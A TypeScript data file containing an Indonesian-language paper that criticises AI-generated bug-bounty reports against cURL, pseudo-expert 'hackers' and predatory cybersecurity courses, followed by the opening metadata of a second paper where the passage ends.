export interface DocumentSection {
  id: string;
  title: string;
  level: number;
  content: string[];
}

export interface ResearchDocument {
  id: string;
  title: string;
  subtitle: string;
  classification: "RESTRICTED" | "CONFIDENTIAL" | "PUBLIC";
  date: string;
  authors: string[];
  organization: string;
  volume: string;
  pages: number;
  abstract: string;
  keywords: string[];
  sections: DocumentSection[];
  references: string[];
}

export const documents: ResearchDocument[] = [
  {
    id: "ZERO-2025-001",
    title: "Jurnal Keamanan Siber & Etika Teknologi Indonesia",
    subtitle: "Analisis Kritis: AI Slop, Pseudo-Pakar, dan Kursus Online Predatif dalam Ekosistem Keamanan Siber Indonesia",
    classification: "PUBLIC",
    date: "April 2025",
    authors: ["pwn0sec"],
    organization: "PT. PwnOsec Technologies Ltd",
    volume: "Vol. 1 | No. 1",
    pages: 25,
    abstract: "Makalah ini menganalisis secara kritis dua fenomena yang saling berkaitan dan sama-sama mengancam integritas komunitas keamanan siber Indonesia: pertama, meningkatnya ketergantungan peneliti pemula terhadap alat Kecerdasan Buatan (AI) untuk menghasilkan laporan kerentanan tanpa pemahaman teknis yang memadai; kedua, proliferasi pseudo-pakar teknologi yang mengeksploitasi kesenjangan literasi digital masyarakat melalui kursus online berbayar yang tidak bermutu. Berdasarkan observasi empiris terhadap laporan-laporan di platform bug bounty HackerOne -- khususnya program cURL -- serta analisis terhadap ekosistem edukasi keamanan siber daring di Indonesia, makalah ini memaparkan: (1) batasan fundamental AI sebagai alat pencarian kerentanan mandiri; (2) anatomi dan modus operandi pseudo-pakar teknologi yang menyamarkan ketidakmampuan di balik terminologi teknis; (3) mekanisme predasi melalui kursus online yang menjanjikan keahlian hacking instan; serta (4) dampak sistemik kedua fenomena tersebut terhadap kepercayaan publik, reputasi komunitas, dan keamanan nasional. Makalah diakhiri dengan kerangka metodologis untuk mengidentifikasi kursus dan mentor yang legitimate, serta panduan pengembangan kompetensi yang berbasis ilmu pengetahuan otentik.",
    keywords: ["keamanan siber", "kecerdasan buatan", "bug bounty", "HackerOne", "cURL", "pseudo-pakar", "kursus online predatif", "AI slop", "vulnerability research", "etika digital", "literasi teknologi", "komunitas Indonesia"],
    sections: [
      {
        id: "bab-1",
        title: "BAB I: PENDAHULUAN",
        level: 1,
        content: [
          "Seiring berkembangnya permukaan serangan digital, permintaan terhadap peneliti keamanan berkualitas tinggi pun melonjak secara eksponensial. Platform bug bounty seperti HackerOne, Bugcrowd, dan Intigriti telah menjadi ekosistem vital yang menghubungkan peneliti independen dengan organisasi yang membutuhkan perspektif keamanan eksternal.",
          "Di tengah dinamika ini, dua fenomena paralel muncul dan saling memperkuat satu sama lain. Pertama, kemunculan model bahasa besar (Large Language Models/LLMs) dan alat AI generatif memunculkan ekspektasi keliru bahwa AI dapat \"meretas sistem secara otomatis\" tanpa pemahaman teknis. Kedua, proliferasi pelaku yang mengklaim diri sebagai pakar keamanan siber atau \"hacker profesional\" namun sesungguhnya tidak memiliki kompetensi substansial -- dan memonetisasi klaim palsu tersebut melalui kursus online berbayar yang menargetkan masyarakat awam.",
          "Kedua fenomena ini tidak berdiri sendiri. Mereka adalah simptom dari permasalahan yang lebih mendasar: kesenjangan literasi teknologi yang lebar di masyarakat Indonesia, yang menciptakan ruang subur bagi ilusi dan eksploitasi."
        ]
      },
      {
        id: "bab-1-2",
        title: "1.2 Perumusan Masalah",
        level: 2,
        content: [
          "Makalah ini mengajukan empat pertanyaan penelitian utama:",
          "1. Apakah AI memiliki kapabilitas fundamental untuk secara mandiri menemukan dan memvalidasi kerentanan perangkat lunak yang kompleks?",
          "2. Siapakah pseudo-pakar teknologi itu, bagaimana ciri-cirinya, dan mengapa mereka berbahaya bagi komunitas?",
          "3. Bagaimana modus operandi kursus online predatif dalam eksploitasi kesenjangan literasi digital, dan apa dampaknya terhadap korban?",
          "4. Apa kerangka kerja yang dapat digunakan untuk membedakan kompetensi sejati dari ilusi kompetensi dalam konteks keamanan siber?"
        ]
      },
      {
        id: "bab-1-3",
        title: "1.3 Tujuan dan Manfaat",
        level: 2,
        content: [
          "Makalah ini bertujuan untuk:",
          "-- Memberikan analisis teknis mendalam mengenai batasan kapabilitas AI dalam riset keamanan siber.",
          "-- Mendefinisikan dan mendokumentasikan fenomena pseudo-pakar teknologi di Indonesia secara sistematis.",
          "-- Menganalisis mekanisme dan dampak kursus online predatif dalam ekosistem edukasi keamanan siber.",
          "-- Menyajikan studi kasus konkret sebagai ilustrasi empiris.",
          "-- Menawarkan panduan praktis bagi masyarakat untuk melindungi diri dari penipuan berkedok edukasi teknologi.",
          "-- Mendorong budaya riset keamanan yang berbasis ilmu pengetahuan, etika, dan integritas di komunitas Indonesia."
        ]
      },
      {
        id: "bab-1-4",
        title: "1.4 Metodologi",
        level: 2,
        content: [
          "Makalah ini menggunakan pendekatan analisis deskriptif-kualitatif berbasis observasi partisipatif. Data primer bersumber dari pengamatan langsung terhadap laporan yang diajukan ke platform HackerOne, khususnya pada program bug bounty cURL antara tahun 2023-2024. Data sekunder diperoleh dari dokumentasi yang dipublikasikan oleh Daniel Stenberg (pengembang cURL), diskusi di Hacker News, dan analisis konten kursus online keamanan siber yang beredar di Indonesia."
        ]
      },
      {
        id: "bab-2",
        title: "BAB II: TINJAUAN LITERATUR DAN KERANGKA TEORITIS",
        level: 1,
        content: []
      },
      {
        id: "bab-2-1",
        title: "2.1 Evolusi Riset Kerentanan Perangkat Lunak",
        level: 2,
        content: [
          "Riset kerentanan (vulnerability research) adalah disiplin ilmu yang bertujuan mengidentifikasi, menganalisis, dan mendokumentasikan kelemahan dalam sistem komputer yang dapat dieksploitasi pihak tidak berwenang. Sejarahnya dapat ditelusuri ke era 1980-an ketika komunitas hacker etis pertama kali mulai mendokumentasikan kelemahan sistem secara sistematik.",
          "[TABLE:Era 1980-1990an|Eksplorasi manual sistem UNIX; budaya hacker etis terbentuk],[Era 2000-2010an|Fuzzing otomatis; analisis biner; munculnya platform CVE publik],[Era 2010-2020an|Platform bug bounty; penelitian terdistribusi global; responsible disclosure],[Era 2020-Sekarang|Keterlibatan AI/ML; debat peran otomatisasi; proliferasi pseudo-expert]"
        ]
      },
      {
        id: "bab-2-2",
        title: "2.2 Kecerdasan Buatan dalam Keamanan Siber",
        level: 2,
        content: [
          "AI telah berhasil diaplikasikan pada sejumlah domain keamanan yang terbatas, antara lain: deteksi anomali berbasis perilaku jaringan (IDS/IPS berbasis ML), klasifikasi malware menggunakan supervised learning, analisis log dalam skala besar, dan generasi fuzzing input dasar. Namun, peneliti kelas dunia seperti yang tergabung dalam Project Zero Google dan Offensive Security secara konsisten menegaskan bahwa penemuan kerentanan tingkat tinggi masih sepenuhnya bergantung pada kapabilitas kognitif manusia."
        ]
      },
      {
        id: "bab-2-3",
        title: "2.3 Ekosistem Bug Bounty dan Standar Kualitas",
        level: 2,
        content: [
          "Platform HackerOne menetapkan standar ketat dalam penilaian laporan kerentanan. Sebuah laporan dinilai valid apabila memenuhi kriteria: dapat direproduksi secara konsisten, berada dalam scope program, berdampak nyata terhadap keamanan, disertai PoC yang berfungsi, dan mengikuti disclosure policy. Laporan yang gagal mendapatkan status Informative, Duplicate, atau Not Applicable (NA)."
        ]
      },
      {
        id: "bab-2-4",
        title: "2.4 Konsep Dunning-Kruger Effect dalam Konteks Teknologi",
        level: 2,
        content: [
          "Efek Dunning-Kruger, pertama kali dipaparkan oleh David Dunning dan Justin Kruger (1999), mendeskripsikan fenomena kognitif di mana individu dengan kompetensi rendah secara sistematis melebih-lebihkan kemampuan mereka sendiri. Sebaliknya, individu yang sangat kompeten cenderung meremehkan kemampuan mereka karena mereka menyadari betapa kompleksnya domain tersebut.",
          "Dalam konteks keamanan siber, efek ini menghasilkan paradoks yang berbahaya: seorang pemula yang baru belajar menggunakan tools otomatis selama seminggu dapat merasa lebih percaya diri daripada peneliti berpengalaman yang memahami betapa dalamnya ketidaktahuan yang masih perlu ia atasi. Pseudo-pakar teknologi adalah manifestasi ekstrem dari efek Dunning-Kruger -- dan mereka secara aktif mengeksploitasinya untuk keuntungan finansial."
        ]
      },
      {
        id: "bab-3",
        title: "BAB III: MENGAPA AI TIDAK DAPAT MENEMUKAN KERENTANAN SECARA MANDIRI",
        level: 1,
        content: []
      },
      {
        id: "bab-3-1",
        title: "3.1 Perbedaan Fundamental: Pola Statistik vs. Pemahaman Kausal",
        level: 2,
        content: [
          "Inti permasalahan terletak pada perbedaan mendasar antara cara kerja AI dan proses kognitif yang dibutuhkan dalam riset keamanan. AI generatif beroperasi berdasarkan pengenalan dan reproduksi pola statistik dari data pelatihan. Ini sangat berbeda dari proses berpikir yang diperlukan untuk menemukan kerentanan baru.",
          "Sebuah kerentanan yang belum pernah ada sebelumnya -- disebut zero-day -- tidak memiliki representasi statistik yang memadai dalam data pelatihan AI. Secara teoritikal, AI tidak dapat menemukan apa yang belum pernah diketahui. Ia hanya mampu memproyeksikan pola kerentanan yang sudah didokumentasikan ke dalam kode baru, menghasilkan tingkat false positive yang tinggi dan false negative yang berbahaya.",
          "[QUOTE:\"The fool doth think he is wise, but the wise man knows himself to be a fool.\" -- William Shakespeare, As You Like It. Dalam konteks keamanan siber modern: seorang pemula yang baru mengenal Kali Linux merasa dirinya hacker; seorang peneliti veteran yang telah menemukan puluhan CVE tahu betapa banyak yang belum ia ketahui.]"
        ]
      },
      {
        id: "bab-3-2",
        title: "3.2 Lima Dimensi Kapabilitas yang Tidak Dimiliki AI",
        level: 2,
        content: [
          "3.2.1 Pemahaman Semantik Kode yang Mendalam -- Membaca kode adalah satu hal; memahami implikasi keamanannya dalam konteks eksekusi nyata adalah hal yang berbeda sepenuhnya. AI melihat kode sebagai teks; peneliti keamanan melihat kode sebagai sistem dinamis yang berinteraksi dengan prosesor, memori, OS, dan jaringan secara simultan.",
          "3.2.2 Intuisi dan Naluri Analitis -- Setelah ribuan jam menganalisis kode dan binary, peneliti keamanan mengembangkan apa yang disebut sebagai security intuition -- kemampuan untuk merasakan di mana kerentanan kemungkinan besar bersembunyi bahkan sebelum analisis formal dilakukan.",
          "3.2.3 Eksplorasi Hipotesis Iteratif -- Riset keamanan sesungguhnya adalah siklus ilmiah: membangun hipotesis, merancang eksperimen, menginterpretasikan hasil yang ambigu, merevisi hipotesis, dan mengulanginya.",
          "3.2.4 Pemahaman Konteks Bisnis dan Logika Aplikasi -- Banyak kerentanan paling berharga -- terutama dalam kategori logika bisnis -- tidak terlihat melalui analisis kode saja.",
          "3.2.5 Reverse Engineering dan Analisis Biner -- Sebagian besar perangkat lunak komersial tidak menyediakan kode sumber. Menemukan kerentanan dalam software closed-source memerlukan kemampuan membaca bahasa assembly, memahami konvensi pemanggilan fungsi berbagai arsitektur prosesor."
        ]
      },
      {
        id: "bab-3-3",
        title: "3.3 Taksonomi Kerentanan yang Tidak Dapat Ditemukan AI",
        level: 2,
        content: [
          "[TABLE_HEADER:JENIS KERENTANAN|MENGAPA AI TIDAK BISA|KEMAMPUAN AI]",
          "[TABLE:Race Condition / TOCTOU|Timing & thread scheduling|Sangat Rendah],[Heap UAF & Overflow|Manajemen memori tingkat rendah|Sangat Rendah],[Type Confusion Biner|ABI & representasi tipe data|Sangat Rendah],[Logic Flaws Autentikasi|Model ancaman aplikasi menyeluruh|Rendah],[Chained Vulnerabilities|Kreativitas menghubungkan bug|Sangat Rendah],[Side-Channel Attacks|Eksperimen fisik & pengukuran|Tidak Ada],[Format String Zero-Day|Penggunaan variadic functions|Rendah],[Integer Overflow Kontekstual|Platform-specific compiler behavior|Sangat Rendah]"
        ]
      },
      {
        id: "bab-4",
        title: "BAB IV: STUDI KASUS -- AI SLOP PADA PROGRAM BUG BOUNTY cURL",
        level: 1,
        content: []
      },
      {
        id: "bab-4-1",
        title: "4.1 Mengapa cURL Adalah Target yang Sangat Tidak Tepat bagi Pemula",
        level: 2,
        content: [
          "cURL adalah perpustakaan transfer data dan alat command-line yang dikembangkan Daniel Stenberg sejak 1998. Digunakan oleh miliaran perangkat dan dipercaya sebagai komponen inti ribuan aplikasi produksi global, cURL adalah salah satu proyek open-source yang paling kritis sekaligus paling teliti diaudit di dunia.",
          "Menemukan kerentanan valid di cURL memerlukan pemahaman mendalam tentang puluhan protokol jaringan (HTTP/1.1, HTTP/2, HTTP/3, FTP, SMTP, IMAP, LDAP, dan lebih dari 25 lainnya), implementasi TLS/SSL dan manajemen sertifikat X.509, manajemen memori tingkat rendah dalam bahasa C termasuk aritmetika pointer, parsing kompleks URI sesuai RFC, dan perilaku berbeda antara puluhan platform.",
          "[QUOTE:cURL bukan website atau aplikasi web yang dapat dipindai dengan scanner otomatis. cURL adalah perangkat lunak sistem tingkat rendah dalam bahasa C -- wilayah di mana kesalahan satu byte dapat mengubah perilaku eksekusi secara fundamental. Menargetkannya menggunakan AI tanpa memahami bahasa C sama saja dengan mencoba mereparasi mesin jet tanpa pernah mempelajari aerodinamika.]"
        ]
      },
      {
        id: "bab-4-2",
        title: "4.2 Pola AI Slop yang Teridentifikasi",
        level: 2,
        content: [
          "Komunitas keamanan dan Daniel Stenberg sendiri telah mendokumentasikan membanjirnya laporan kerentanan yang dihasilkan AI ke program cURL. Laporan-laporan ini menunjukkan pola yang sangat konsisten:",
          "-- Bahasa laporan terstruktur sempurna namun tidak memiliki substansi teknis yang dapat diverifikasi.",
          "-- Klaim kerentanan yang bertentangan dengan arsitektur dan desain cURL yang sebenarnya.",
          "-- Proof-of-concept yang tidak dapat direproduksi atau tidak masuk akal secara teknis.",
          "-- Terminologi teknis digunakan secara tidak tepat atau dicampur secara inkoheren.",
          "-- Tidak adanya pemahaman bahwa cURL adalah library C, bukan aplikasi web atau layanan cloud.",
          "-- Penggunaan kategori kerentanan yang tidak diakui dalam standar CWE, CVE, atau OWASP."
        ]
      },
      {
        id: "bab-4-3",
        title: "4.3 Analisis Tiga Laporan Representatif",
        level: 2,
        content: [
          "4.3.1 Buffer Overflow Risk in Curl_inet_ntop -- Laporan ini mengklaim risiko buffer overflow dalam fungsi Curl_inet_ntop. Analisis teknis terhadap implementasi aktual menunjukkan: ukuran buffer yang dialokasikan sudah didefinisikan dengan tepat sesuai RFC 4291 (INET6_ADDRSTRLEN = 46 bytes), tidak ada vektor input yang dapat dikontrol penyerang secara langsung. Klaim muncul dari AI yang mencocokkan pola \"fungsi konversi string\" dengan pola kerentanan buffer overflow tanpa memvalidasi konteks. Status: Not Applicable.",
          "4.3.2 Silent TLS Trust Model Hijacking via Design -- Laporan ini mengklaim desain model kepercayaan TLS cURL memungkinkan serangan Man-in-the-Middle yang \"senyap\". Ini mencerminkan ketidakpahaman mendasar: model kepercayaan sertifikat TLS adalah by design, bukan kerentanan. Ini setara dengan mengklaim bahwa pintu rumah \"rentan\" karena dapat dibuka dengan kunci yang benar. Status: Ditolak.",
          "4.3.3 Arbitrary Configuration File Inclusion (ACFI) -- Laporan ini mengklaim kerentanan \"Arbitrary Configuration File Inclusion\" melalui fitur file konfigurasi. Istilah \"ACFI\" tidak diakui dalam standar CWE, CVE, atau OWASP. Ini adalah terminologi yang diciptakan AI. Status: Not Applicable."
        ]
      },
      {
        id: "bab-5",
        title: "BAB V: ANATOMI PSEUDO-PAKAR TEKNOLOGI",
        level: 1,
        content: []
      },
      {
        id: "bab-5-1",
        title: "5.1 Definisi dan Karakteristik",
        level: 2,
        content: [
          "Pseudo-pakar teknologi (selanjutnya disebut PPT) adalah individu yang secara aktif mengklaim keahlian teknis -- khususnya dalam bidang keamanan siber, hacking, atau pemrograman -- yang tidak dimilikinya secara substansial, dan menggunakan klaim tersebut untuk memperoleh kepercayaan publik, pengikut media sosial, atau keuntungan finansial.",
          "PPT berbeda dari pemula biasa dalam satu aspek kritis: pemula menyadari keterbatasannya dan berusaha belajar. PPT tidak menyadari (atau sengaja mengabaikan) keterbatasannya dan secara aktif memasarkan dirinya sebagai ahli."
        ]
      },
      {
        id: "bab-5-2",
        title: "5.2 Profil Psikologis dan Motivasi",
        level: 2,
        content: [
          "[TABLE_HEADER:FAKTOR PSIKOLOGIS|MANIFESTASI]",
          "[TABLE:Dunning-Kruger Effect Ekstrem|Kompetensi rendah menghasilkan kepercayaan diri yang tidak proporsional],[Confirmation Bias|Hanya menyerap informasi yang mengkonfirmasi klaim keahlian mereka],[Motivasi Finansial|Kursus, konsultasi, dan endorse produk menghasilkan pendapatan nyata],[Kebutuhan Pengakuan Sosial|Algoritma media sosial memberikan reward kepada konten yang mengklaim keahlian],[Echo Chamber Media Sosial|Audiens yang tidak kompeten tidak dapat memverifikasi klaim PPT],[Impostor Syndrome Terbalik|Alih-alih merasa tidak kompeten, PPT merasa lebih superior dari semua orang]"
        ]
      },
      {
        id: "bab-5-3",
        title: "5.3 Dua Puluh Tanda Peringatan Pseudo-Pakar Teknologi",
        level: 2,
        content: [
          "Kategori A: Tanda-tanda dalam Konten yang Dipublikasikan",
          "1. Menggunakan terminologi teknis yang tidak tepat atau mencampur jargon dari domain berbeda secara tidak koheren.",
          "2. Tidak dapat menjelaskan konsep teknis tanpa menggunakan analogi yang sangat disederhanakan hingga salah secara teknis.",
          "3. Klaim keberhasilan yang tidak dapat diverifikasi: \"saya berhasil meretas X\" tanpa CVE number, Hall of Fame entry, atau bukti apapun.",
          "4. Demonstrasi menggunakan tools yang sudah dikonfigurasi sebelumnya di lab terkontrol, dipresentasikan seolah-olah merupakan eksploitasi dunia nyata.",
          "5. Konten yang semata-mata mengulangi informasi yang sudah ada di internet tanpa menambahkan analisis atau wawasan baru.",
          "6. Menggunakan AI untuk menghasilkan penjelasan teknis dan menyajikannya sebagai pemahaman pribadi.",
          "",
          "Kategori B: Tanda-tanda dalam Interaksi dan Respons",
          "7. Tidak mampu menjawab pertanyaan teknis spesifik tanpa melarikan diri ke jawaban umum atau mengubah topik.",
          "8. Menjadi defensif atau agresif ketika kompetensinya dipertanyakan oleh seseorang yang lebih kompeten.",
          "9. Tidak memiliki profil yang dapat diverifikasi pada platform yang relevan (HackerOne, CVE database, GitHub dengan kontribusi nyata).",
          "10. Tidak dapat menulis kode fungsional di luar copy-paste dari Stack Overflow atau AI.",
          "11. Mengklaim pengalaman \"bertahun-tahun\" namun tidak dapat menyebutkan kerentanan spesifik yang pernah ditemukan.",
          "12. Tidak familiar dengan tools fundamental: GDB, Wireshark, Burp Suite, atau tools setara.",
          "",
          "Kategori C: Tanda-tanda dalam Konteks Komersial",
          "13. Menawarkan \"sertifikasi\" atau \"membership\" eksklusif yang tidak diakui oleh industri.",
          "14. Menggunakan FOMO secara agresif dalam pemasaran.",
          "15. Memberikan jaminan hasil yang tidak realistis: \"dalam 30 hari Anda akan bisa meretas apapun\".",
          "16. Menghindari diskusi teknis mendalam dalam sesi demo atau webinar.",
          "17. Tidak dapat menjawab pertanyaan teknis dari peserta kursus.",
          "18. Harga kursus yang tidak proporsional tanpa justifikasi.",
          "19. Testimonial yang tidak dapat diverifikasi.",
          "20. Menggunakan klaim asosiasi dengan perusahaan/institusi terkenal yang tidak dapat diverifikasi."
        ]
      },
      {
        id: "bab-5-4",
        title: "5.4 Mengapa PPT Berbahaya bagi Komunitas dan Publik",
        level: 2,
        content: [
          "5.4.1 Kerusakan pada Reputasi Komunitas -- Ketika PPT mengklaim menjadi representasi komunitas keamanan siber Indonesia, setiap kesalahan mereka mencoreng reputasi seluruh komunitas.",
          "5.4.2 Distorsi Ekspektasi Pasar -- Ketika PPT menentukan harga jasa berdasarkan klaim yang tidak berdasar, mereka mendistorsi persepsi pasar tentang nilai kompetensi keamanan siber yang sesungguhnya.",
          "5.4.3 Risiko Keamanan Nyata -- Organisasi yang mempercayakan keamanan sistem mereka kepada PPT mendapatkan rasa aman yang palsu. Dalam konteks infrastruktur kritis, ini dapat memiliki konsekuensi yang sangat serius."
        ]
      },
      {
        id: "bab-6",
        title: "BAB VI: ANATOMI KURSUS ONLINE PREDATIF",
        level: 1,
        content: []
      },
      {
        id: "bab-6-1",
        title: "6.1 Mengapa Keamanan Siber Menjadi Target Utama",
        level: 2,
        content: [
          "Tidak ada bidang teknologi lain yang lebih rentan terhadap komersialisasi predatif daripada keamanan siber. Beberapa faktor struktural:",
          "-- Kesenjangan pengetahuan yang lebar antara publik dan praktisi membuat evaluasi kualitas hampir mustahil bagi calon pembeli.",
          "-- Glamour dan misteri yang melekat pada kata \"hacker\" menciptakan daya tarik emosional yang kuat.",
          "-- Narasi penghasilan tinggi -- sebagian besar dilebih-lebihkan -- menciptakan motivasi finansial yang kuat.",
          "-- Tidak adanya regulasi atau standar industri yang mengikat di Indonesia.",
          "-- Algoritma media sosial yang memberikan reward kepada konten sensasional atas konten yang akurat."
        ]
      },
      {
        id: "bab-6-2",
        title: "6.2 Modus Operandi Kursus Predatif",
        level: 2,
        content: [
          "6.2.1 Fase Akuisisi: Menarik Korban -- Konten clickbait di media sosial, flexing palsu, demonstrasi alat-alat yang terkesan canggih, menciptakan urgensi artifisial, dan testimonial tidak autentik.",
          "6.2.2 Fase Konversi: Menjual Ilusi -- Memberikan akses ke tools tanpa mengajarkan fundamental, kurikulum yang superfisial, menggunakan bahasa teknis kosong, sertifikat yang tidak diakui, dan membungkus konten gratis dengan presentasi yang dipoles.",
          "6.2.3 Fase Retensi dan Upselling -- \"Komunitas eksklusif\" berbayar, mentoring one-on-one premium, kursus lanjutan, dan affiliate program."
        ]
      },
      {
        id: "bab-6-3",
        title: "6.3 Dampak terhadap Korban",
        level: 2,
        content: [
          "[TABLE_HEADER:JENIS KERUGIAN|MANIFESTASI|DAMPAK JANGKA PANJANG]",
          "[TABLE:Kerugian Finansial|Ratusan ribu hingga jutaan rupiah|Uang hilang, tidak ada kompetensi yang dapat dimonetisasi],[Kerugian Waktu|Puluhan jam belajar yang tidak produktif|Waktu yang bisa digunakan untuk belajar secara otentik],[Kerugian Psikologis|False confidence yang kontraproduktif|Frustasi saat menemui kenyataan di lapangan],[Risiko Hukum|Mencoba teknik yang dipelajari tanpa izin|Konsekuensi hukum yang serius di bawah UU ITE],[Kerugian Karir|Ekspektasi karir yang tidak realistis|Burnout dan meninggalkan bidang sepenuhnya]"
        ]
      },
      {
        id: "bab-7",
        title: "BAB VII: DAMPAK SISTEMIK DAN IMPLIKASI NASIONAL",
        level: 1,
        content: []
      },
      {
        id: "bab-7-1",
        title: "7.1 Dampak terhadap Ekosistem Bug Bounty",
        level: 2,
        content: [
          "7.1.1 Beban Triage yang Meningkat -- Tim triage di setiap program bug bounty memiliki kapasitas terbatas. Ketika laporan AI slop membanjiri antrian, laporan valid dari peneliti kompeten dapat tertunda penanganannya.",
          "7.1.2 Degradasi Kepercayaan Platform -- Vendor yang menerima terlalu banyak laporan tidak berkualitas dapat meragukan nilai program bug bounty.",
          "7.1.3 Distorsi Metrik dan Reputasi -- Ketika laporan AI slop merusak metrik secara sistematis, sistem reputasi menjadi kurang efektif."
        ]
      },
      {
        id: "bab-7-2",
        title: "7.2 Dampak terhadap Keamanan Nasional",
        level: 2,
        content: [
          "Dampak yang paling serius adalah implikasi terhadap keamanan siber nasional Indonesia:",
          "-- Infrastruktur kritis yang dianggap aman padahal belum pernah diaudit secara kompeten.",
          "-- Investasi dalam solusi keamanan yang tidak efektif berdasarkan rekomendasi PPT.",
          "-- Sumber daya manusia keamanan siber nasional yang secara statistik lemah.",
          "-- Ketergantungan pada vendor atau konsultan asing karena tidak adanya kepercayaan terhadap praktisi lokal."
        ]
      },
      {
        id: "bab-7-3",
        title: "7.3 Dampak terhadap Pengembangan Talenta Jangka Panjang",
        level: 2,
        content: [
          "Dampak yang paling insidius adalah efek jangka panjang terhadap pengembangan talenta. Ketika seseorang belajar bahwa ia dapat \"menghasilkan laporan bug bounty\" hanya dengan AI atau \"menjadi hacker\" hanya dengan kursus 30 hari, ia kehilangan motivasi untuk menempuh jalur belajar yang sesungguhnya.",
          "Hasilnya adalah generasi yang iliterasi secara teknis namun percaya diri secara palsu -- kombinasi yang berbahaya dalam domain keamanan siber."
        ]
      },
      {
        id: "bab-8",
        title: "BAB VIII: REKOMENDASI DAN PANDUAN PENGEMBANGAN KOMPETENSI OTENTIK",
        level: 1,
        content: []
      },
      {
        id: "bab-8-1",
        title: "8.1 Fondasi Teknis yang Wajib Dibangun",
        level: 2,
        content: [
          "Bagi siapa pun yang serius berkarir dalam riset keamanan:",
          "1. Pemrograman: minimal satu bahasa tingkat rendah (C/C++) dan satu bahasa scripting (Python).",
          "2. Sistem Operasi: arsitektur proses Linux dan Windows, manajemen memori virtual, kernel space vs. user space.",
          "3. Jaringan: model OSI secara mendalam, TCP/IP stack, HTTP/HTTPS, TLS/SSL, Wireshark dan tcpdump.",
          "4. Assembly dasar: mampu membaca disassembly x86/x64 menggunakan Ghidra atau IDA Free.",
          "5. Kategori kerentanan utama: CWE Top 25, OWASP Top 10.",
          "6. Debugging: GDB dengan pwndbg, atau x64dbg untuk Windows.",
          "7. Platform praktik: HackTheBox, TryHackMe, picoCTF, dan CTF competitions."
        ]
      },
      {
        id: "bab-8-2",
        title: "8.2 Metodologi Penelitian yang Benar",
        level: 2,
        content: [
          "Sebelum menargetkan program bug bounty apapun, seorang peneliti harus mampu menjawab:",
          "-- Apa yang sebenarnya dilakukan oleh perangkat lunak atau aplikasi target ini?",
          "-- Siapa yang menggunakannya, dalam konteks apa, dan apa model ancaman yang relevan?",
          "-- Apa yang terdefinisi sebagai in-scope dan out-of-scope?",
          "-- Kerentanan jenis apa yang paling relevan dengan arsitektur target?",
          "-- Apakah saya memiliki alat, pengetahuan, dan lingkungan yang diperlukan?",
          "-- Dapatkah saya mendemonstrasikan dampak kerentanan secara konkret dan terukur?"
        ]
      },
      {
        id: "bab-8-3",
        title: "8.3 Kapan Tidak Mengajukan Laporan",
        level: 2,
        content: [
          "Salah satu tanda kedewasaan seorang peneliti keamanan adalah kemampuan menahan diri. Jangan ajukan laporan apabila:",
          "-- Laporan dihasilkan sepenuhnya atau sebagian besar oleh AI tanpa verifikasi teknis mandiri.",
          "-- Anda tidak dapat menjelaskan mekanisme teknis kerentanan tanpa bantuan AI.",
          "-- Tidak ada proof-of-concept yang dapat didemonstrasikan.",
          "-- Anda tidak memiliki pemahaman dasar tentang teknologi target.",
          "-- Laporan didasarkan pada asumsi atau spekulasi tanpa bukti empiris.",
          "-- Anda tidak yakin apakah temuan berada dalam scope program."
        ]
      },
      {
        id: "bab-9",
        title: "BAB IX: KESIMPULAN",
        level: 1,
        content: [
          "Makalah ini telah memaparkan secara komprehensif dua ancaman yang saling terkait dalam ekosistem keamanan siber Indonesia: ilusi bahwa AI dapat menggantikan kompetensi teknis dalam riset kerentanan, dan ilusi bahwa pseudo-pakar dan kursus online predatif dapat memberikan kompetensi yang sesungguhnya dalam waktu singkat.",
          "Tujuh temuan utama:",
          "1. AI tidak memiliki pemahaman kausal, kontekstual, dan semantik yang diperlukan untuk riset keamanan tingkat lanjut.",
          "2. Laporan kerentanan yang dihasilkan AI tanpa verifikasi teknis mandiri hampir pasti berakhir sebagai Not Applicable.",
          "3. Pseudo-pakar teknologi adalah fenomena yang berbahaya bagi keamanan komunitas dan nasional.",
          "4. Kursus online predatif mengeksploitasi kesenjangan literasi digital dengan menjual ilusi kompetensi.",
          "5. Keamanan siber adalah sains terapan yang tidak memiliki jalan pintas yang sah.",
          "6. Komunitas keamanan siber Indonesia memiliki talenta nyata yang harus dilindungi reputasinya.",
          "7. Transformasi ekosistem yang sehat memerlukan edukasi publik, regulasi yang lebih ketat, dan penghargaan terhadap kompetensi otentik."
        ]
      }
    ],
    references: [
      "pwn0sec. (2025). Please Stop Waste Your Time for Reporting a False Security Vulnerabilities Used AI! Medium.",
      "Hacker News / Y Combinator. (2024). AI slop security reports submitted to curl. Hacker News.",
      "HackerOne. (2024). Disclosed Report: Buffer Overflow Risk in Curl_inet_ntop -- curl. https://hackerone.com/reports/2613898",
      "HackerOne. (2024). Disclosed Report: Silent TLS Trust Model Hijacking via Design -- curl. https://hackerone.com/reports/2495293",
      "HackerOne. (2024). Disclosed Report: Arbitrary Configuration File Inclusion -- curl. https://hackerone.com/reports/2597485",
      "Stenberg, D. (2024). The curl bug bounty program -- official documentation. https://curl.se/docs/bugbounty.html",
      "Stenberg, D. (2024). AI-generated security reports. https://daniel.haxx.se/blog/2024/01/02/the-i-in-llm-stands-for-intelligence/",
      "MITRE Corporation. (2024). CWE Top 25 Most Dangerous Software Weaknesses 2024. https://cwe.mitre.org/top25/",
      "OWASP Foundation. (2021). OWASP Top 10 Web Application Security Risks. https://owasp.org/Top10/",
      "HackerOne. (2024). The 2024 Hacker-Powered Security Report. https://www.hackerone.com/resources/hackerone/hacker-powered-security-report",
      "NVD / NIST. (2024). National Vulnerability Database. https://nvd.nist.gov/",
      "Dunning, D. & Kruger, J. (1999). Unskilled and Unaware of It. Journal of Personality and Social Psychology, 77(6), 1121-1134.",
      "Offensive Security. (2024). PWK -- Penetration Testing with Kali Linux: OSCP Course Overview. https://www.offensive-security.com/courses/pen-200/",
      "PortSwigger. (2024). Web Security Academy. https://portswigger.net/web-security",
      "BSSN. (2024). Laporan Tahunan Keamanan Siber Nasional 2023. https://bssn.go.id"
    ]
  },
  {
    id: "ZERO-2025-002",
    title: "Fenomena Developer Instan, Miskonsepsi tentang Cybersecurity, dan Bahaya Edukasi Teknologi yang Dibangun di Atas Ilusi",
    subtitle: "Analisis kritis dan sistematis terhadap instanisasi profesi teknologi dan miskonsepsi publik tentang definisi, kapabilitas, dan etika seorang hacker dalam ekosistem teknologi Indonesia",
    classification: "PUBLIC",
    date: "April 2025",
    authors: ["number01", "pwn0sec"],
    organization: "PT. PwnOsec Technologies Ltd",
    volume: "Vol. 1 | No. 2 | Seri II",
    pages: 30,
